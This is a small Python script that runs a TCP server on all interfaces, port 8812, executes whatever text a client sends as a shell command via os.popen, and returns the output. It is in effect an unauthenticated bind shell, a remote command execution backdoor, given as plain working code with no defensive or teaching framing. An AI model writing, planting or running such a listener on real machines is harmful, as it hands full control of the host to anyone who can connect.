# -*- coding: utf-8 -*-
import os
import socket 

HOST = '0.0.0.0'
PORT = 8812

while True:
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((HOST, PORT))
	server.listen(10)
	print ("Wait client...by %s:%s" % (HOST, PORT))
	conn, addr = server.accept()

	while True:
		try:
			clientMessage = str(conn.recv(1024), encoding='utf-8')
		except:
			break
		d = os.popen(clientMessage)

		print('Client message is:', clientMessage)

		serverMessage = d.read()
		if serverMessage == '':
			conn.sendall("error command".encode())
			print ("error command")
			continue
		conn.sendall(serverMessage.encode())
		print(serverMessage)
conn.close()